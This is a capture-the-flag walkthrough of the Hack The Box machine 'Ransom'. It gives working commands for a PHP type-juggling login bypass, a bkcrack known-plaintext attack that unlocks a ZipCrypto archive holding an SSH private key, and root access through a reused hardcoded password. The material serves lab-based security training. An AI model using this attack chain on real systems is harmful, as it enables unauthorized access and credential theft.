# HTB: Ransom — Full Walkthrough

**Difficulty:** Medium  
**OS:** Linux  
**IP:** 10.129.227.93  
**Attacker IP:** 10.10.16.84  

---

## Table of Contents

1. [Mindset & Methodology](#mindset--methodology)
2. [Step 1 — Port Scanning](#step-1--port-scanning)
3. [Step 2 — Service Enumeration](#step-2--service-enumeration)
4. [Step 3 — Web Reconnaissance](#step-3--web-reconnaissance)
5. [Step 4 — Login Bypass (PHP Type Juggling)](#step-4--login-bypass-php-type-juggling)
6. [Step 5 — Authenticated Session & File Download](#step-5--authenticated-session--file-download)
7. [Step 6 — Analyzing the Encrypted ZIP](#step-6--analyzing-the-encrypted-zip)
8. [Step 7 — Known-Plaintext Attack with bkcrack](#step-7--known-plaintext-attack-with-bkcrack)
9. [Step 8 — Unlocking the ZIP & Extracting the SSH Key](#step-8--unlocking-the-zip--extracting-the-ssh-key)
10. [Step 9 — SSH Access as htb](#step-9--ssh-access-as-htb)
11. [Step 10 — Privilege Escalation to Root](#step-10--privilege-escalation-to-root)
12. [Key Lessons](#key-lessons)

---

## Mindset & Methodology

Before touching a single tool, understand **why** we follow a process:

> A hacker is not someone who randomly tries things. A hacker is someone who **understands systems deeply enough to make them do something unintended**.

The methodology here is:
1. **Enumerate** — find every door and window before trying to open one
2. **Understand** — know what tech stack you're dealing with before attacking it
3. **Exploit** — use the smallest, most precise attack that works
4. **Escalate** — once inside, treat the system like a puzzle; what was left behind?

Every step below follows this loop.

---

## Step 1 — Port Scanning

### What we do

```bash
nmap -p- --min-rate 10000 10.129.227.93
```

### Why

Before anything else, we need to know what services are **listening for connections**. A port is a numbered door on a machine. Open ports = potential entry points.

- `-p-` means scan **all 65535 ports**, not just the common top 1000. Defenders sometimes hide services on unusual ports. We never assume only standard ports are in use.
- `--min-rate 10000` speeds the scan up significantly. On HTB, speed is fine — in real engagements you'd slow down to avoid detection.

### Hacker Mindset

> "I don't know what's running yet. I cast a wide net first, then I get precise."

### Result

```
22/tcp open  ssh
80/tcp open  http
```

Two ports. Small attack surface. Both are standard — SSH for remote shell access and HTTP for a web application. The web app is almost always the primary entry point on HTB boxes.

---

## Step 2 — Service Enumeration

### What we do

```bash
nmap -p 22,80 -sCV 10.129.227.93
```

### Why

Now we know the doors exist. We need to know **what's behind each door**. This scan:
- `-sC` runs default scripts — they probe each service and pull useful info automatically
- `-sV` detects the exact software version running

Version information is critical because:
- Specific versions may have known CVEs
- Version info tells us the OS (Ubuntu 20.04 in this case from OpenSSH version)
- Framework versions affect what vulnerabilities exist

### Result

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
80/tcp open  http    Apache httpd 2.4.41
                     Redirected to http://10.129.227.93/login
```

Key observations:
- SSH is OpenSSH 8.2p1 — no known exploitable CVEs, so we park this for now
- The web server redirects to `/login` — there's a login page we need to deal with
- Apache 2.4.41 + Ubuntu 20.04 focal — this helps if we need to match exploits later

### Hacker Mindset

> "SSH with no CVEs = not my first target. The web app is where the action is."

---

## Step 3 — Web Reconnaissance

### What we do

Visit `http://10.129.227.93` in a browser (or curl). Observe the login page. View page source.

```bash
curl -s http://10.129.227.93/login | grep -A 30 '<script>'
```

### Why

When you see a login page, don't immediately start guessing passwords. **Read the code first**. Modern web apps handle login through JavaScript — understanding how the JS works tells you exactly what request is being made, to which endpoint, with what parameters.

From the page source, the relevant JavaScript is:

```javascript
$('#loginform').submit(function() {
    $.ajax({
        type: "GET",
        url: 'api/login',
        data: {
            password: $("#password").val()
        },
        success: function(data) {
            if (data === 'Login Successful') {
                window.location.replace('/');
            }
        }
    });
});
```

### What this tells us

1. Login is a **GET request** to `/api/login` — unusual. Normally logins are POST.
2. The password is sent as a **URL query parameter**: `/api/login?password=...`
3. The server responds with the string `"Login Successful"` or `"Invalid Login"`

### Hacker Mindset

> "The login is using GET — that's already weird. Passwords in GET requests get logged everywhere. What else is non-standard here? What if I change the data format?"

We also identify the tech stack:
```bash
curl -I http://10.129.227.93
```
Response headers show `laravel_session` cookies → this is a **Laravel** (PHP framework) application. This is critical because Laravel has specific behaviors around how it parses request bodies.

---

## Step 4 — Login Bypass (PHP Type Juggling)

### The Vulnerability

Laravel (and PHP in general) can parse JSON bodies even on GET requests if the `Content-Type: application/json` header is present. More importantly, PHP's loose comparison operator `==` has a dangerous property:

```php
true == "any string at all"  // evaluates to TRUE
```

This is called **type juggling**. When PHP compares a boolean `true` to any non-empty string using `==`, the string gets converted to boolean `true`, and `true == true` is always true.

The server-side code (as we'll confirm later) looks like:

```php
if ($request->get('password') == "UHC-March-Global-PW!") {
    return "Login Successful";
}
```

If we send `{"password": true}` as JSON, PHP receives the boolean `true`, and `true == "UHC-March-Global-PW!"` evaluates to `true` — login bypassed.

### What we do

```bash
curl -s -X GET http://10.129.227.93/api/login \
  -H 'Content-Type: application/json' \
  -d '{"password": true}'
```

### Why this works step by step

1. We send a **GET request** (matching the only allowed method)
2. We set `Content-Type: application/json` — this tells Laravel to parse the body as JSON
3. Laravel's request object reads `password` from the JSON body
4. PHP compares: `true == "UHC-March-Global-PW!"` → `true`
5. Server returns: `"Login Successful"`

### Hacker Mindset

> "The endpoint only accepts GET. I can't brute force. I don't know the password. But I can change the *type* of what I'm sending. What if I don't send a string? What if I send a boolean?"

This is the core of type juggling attacks: **don't just try different values — try different data types**.

### Result

```
Login Successful
```

---

## Step 5 — Authenticated Session & File Download

### The problem

Getting `"Login Successful"` from the API is not enough on its own. The browser maintains a **session cookie** that tracks whether you're logged in. We need to:
1. Get a fresh session cookie from the login page
2. Send the bypass through that same session
3. Use the now-authenticated session to browse the app

### What we do

```bash
# Step 1: Get the session cookie
curl -s -c /tmp/cookies.txt http://10.129.227.93/login > /dev/null

# Step 2: Authenticate using the bypass
curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt -X GET http://10.129.227.93/api/login \
  -H 'Content-Type: application/json' \
  -d '{"password": true}'

# Step 3: Access the authenticated page and find file links
curl -s -b /tmp/cookies.txt http://10.129.227.93/ -o /tmp/page.html
grep -oP 'href="[^"]*"' /tmp/page.html
```

### Why

- `-c /tmp/cookies.txt` saves cookies to a file
- `-b /tmp/cookies.txt` sends those saved cookies with each request
- This simulates what a browser does automatically — maintaining session state

### Result

Two interesting links on the authenticated page:
```
href="/uploaded-file-3422.zip"
href="/user.txt"
```

### Download both files

```bash
# Grab the user flag
curl -s -b /tmp/cookies.txt http://10.129.227.93/user.txt

# Grab the encrypted zip
curl -s -b /tmp/cookies.txt http://10.129.227.93/uploaded-file-3422.zip \
  -o /tmp/uploaded-file-3422.zip
```

**User flag:** `69f82c[redacted]aae72ae`

---

## Step 6 — Analyzing the Encrypted ZIP

### What we do

```bash
7z l -slt /tmp/uploaded-file-3422.zip
```

### Why

Before trying to crack a password-protected file, understand **what type of encryption** it uses. `7z l -slt` lists files with full technical metadata including the encryption method.

Key output:
```
Method = ZipCrypto Deflate
CRC = 6CE3189B
```

### Why this matters enormously

There are two common ZIP encryption methods:
- **AES-256**: Modern, strong — essentially uncrackable without the password
- **ZipCrypto**: Legacy, from the 1990s — **vulnerable to known-plaintext attack**

ZipCrypto is broken. If you know the exact content of **any one file** inside the zip, you can recover the internal encryption keys and decrypt the entire archive — no password needed.

The archive contains `.bash_logout` — a standard Ubuntu file that is almost never changed. The CRC32 value (`6CE3189B`) is a checksum of the decrypted file. We can verify our local copy matches:

```bash
python3 -c "
import binascii
with open('/home/kali/.bash_logout', 'rb') as f:
    data = f.read()
print('Size:', len(data))
print('CRC32:', hex(binascii.crc32(data) & 0xFFFFFFFF))
"
```

Output:
```
Size: 220
CRC32: 0x6ce3189b
```

**Perfect match.** Our local `.bash_logout` is identical to the one in the encrypted zip. We have our known plaintext.

### Hacker Mindset

> "I can't brute-force the password — ZipCrypto uses a 96-bit key. But I don't need to. If I know what one of the files contains, I can attack the cipher directly. What files in a home directory are predictable? .bash_logout, .bashrc, .profile — standard Ubuntu dotfiles that almost nobody changes."

---

## Step 7 — Known-Plaintext Attack with bkcrack

### What we do

```bash
# Create an unencrypted zip with our known plaintext file
cd /tmp && zip plain.zip bash_logout

# Run the known-plaintext attack
bkcrack -C /tmp/uploaded-file-3422.zip -c .bash_logout -P /tmp/plain.zip -p bash_logout
```

### Why

`bkcrack` implements the Biham-Kocher known-plaintext attack against ZipCrypto. It needs:
- `-C` — the encrypted zip (the target)
- `-c` — the name of the known file **inside** the encrypted zip
- `-P` — an unencrypted zip containing our copy of that file
- `-p` — the name of our copy inside the unencrypted zip

The attack works by:
1. Using the known plaintext to derive the internal PRNG state of the ZipCrypto cipher
2. Recovering the three 32-bit internal keys that control the entire encryption
3. Using those keys to decrypt everything else in the archive

This typically takes 1-3 minutes. The math involves reducing 2^96 possible states down to a tractable search space using the known bytes.

### Result

```
Keys: 7b549874 ebc25ec5 7e465e18
```

### Hacker Mindset

> "I'm not attacking the password. I'm attacking the cipher's internal state. These are fundamentally different things. The password could be 50 characters long and I still don't need it."

---

## Step 8 — Unlocking the ZIP & Extracting the SSH Key

### What we do

```bash
# Use the recovered keys to create a new zip with a known password
bkcrack -C /tmp/uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 \
  -U /tmp/unlocked.zip pass

# Extract everything
unzip -P pass /tmp/unlocked.zip -d /tmp/unzipped/
```

### Why

The recovered keys let `bkcrack` re-encrypt the archive with any password we choose. We pick `pass` — simple and memorable. Then we extract normally.

### Result

```
/tmp/unzipped/.ssh/id_rsa      ← private SSH key
/tmp/unzipped/.ssh/id_rsa.pub  ← public key (shows username: htb@ransom)
```

The public key ends with `htb@ransom` — this tells us the username is `htb`.

---

## Step 9 — SSH Access as htb

### What we do

```bash
ssh -i /tmp/unzipped/.ssh/id_rsa htb@10.129.227.93
```

### Why

SSH key authentication uses asymmetric cryptography. The private key (`id_rsa`) proves identity without a password. Since the public key (`id_rsa.pub`) is in the user's `~/.ssh/authorized_keys`, the server accepts our private key as proof we are that user.

### Hacker Mindset

> "The zip contained the user's entire home directory — including their SSH keys. They backed up their home dir and served it through a web app with weak encryption. Now I have their private key and can impersonate them."

### Result

```
htb@ransom:~$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

We're in. Now we escalate.

---

## Step 10 — Privilege Escalation to Root

### Enumeration mindset

Once you have a shell, resist the urge to randomly run `sudo -l` and `linpeas` immediately. **Think about what you already know:**

- This is a Laravel web application
- The login had a hardcoded password comparison in the source code
- We haven't read that source yet — and hardcoded credentials often get reused

### What we do

Find the authentication controller and read the source:

```bash
cat /srv/prod/app/Http/Controllers/AuthController.php
```

### What we find

```php
if ($request->get('password') == "UHC-March-Global-PW!") {
    session(['loggedin' => True]);
    return "Login Successful";
}
```

The password `UHC-March-Global-PW!` is hardcoded in the source. Developers often reuse passwords. Let's try it for root:

```bash
su -
# Password: UHC-March-Global-PW!
```

### Result

```
root@ransom:~# id
uid=0(root) gid=0(root) groups=0(root)

root@ransom:~# cat /root/root.txt
e3b5c[redacted]e0f4c68f
```

**Root flag:** `e3b5c[redacted]e0f4c68f`

### Hacker Mindset

> "The application had a hardcoded password. Developers who hardcode passwords in web apps often reuse those passwords elsewhere on the system — because it's 'just a test' or 'temporary'. Always try found credentials horizontally (other services) and vertically (higher privilege accounts)."

---

## Key Lessons

### 1. Always read source code / JS before attacking a login
The JavaScript told us exactly how the login worked — a GET request with a password parameter. Without reading it, we'd waste time on SQLi and brute force.

### 2. Data type matters as much as data value
The type juggling bypass worked not because we found the right password — we changed the **type** of what we sent. `true` bypassed the check entirely. In PHP (and other weakly typed languages), `==` compares loosely — always look for type confusion opportunities.

### 3. Legacy encryption is often just theater
ZipCrypto encryption provides a false sense of security. The moment you see `Method = ZipCrypto` in a zip file, treat it as effectively unencrypted if you have any known plaintext. Modern tools like bkcrack make this trivial.

### 4. Home directory backups are a goldmine
If an application serves a user's home directory backup, that zip contains:
- SSH keys
- Shell history
- Browser profiles
- Credentials in dotfiles
Always enumerate every file in such archives.

### 5. Hardcoded credentials get reused
The password in the PHP source was the root password. Always try every credential you find against every authentication point: `su`, `sudo`, SSH for other users, database logins, etc.

### 6. Enumeration order matters
We went: web app → auth bypass → download files → crack zip → SSH → read source → su root. Each step gave us exactly what we needed for the next. This is why methodology beats random tool-running.

---

## Full Attack Chain Summary

```
nmap (ports 22, 80)
    └─> Web app on port 80 — Laravel, redirects to /login
            └─> Read JS source — login is GET /api/login?password=...
                    └─> Send JSON {"password": true} — PHP type juggling bypass
                            └─> Authenticated session — download user.txt + zip
                                    └─> 7z shows ZipCrypto + .bash_logout CRC matches local
                                            └─> bkcrack known-plaintext attack → keys
                                                    └─> Unlock zip → id_rsa extracted
                                                            └─> SSH as htb
                                                                    └─> AuthController.php → hardcoded password
                                                                            └─> su - root → root.txt
```
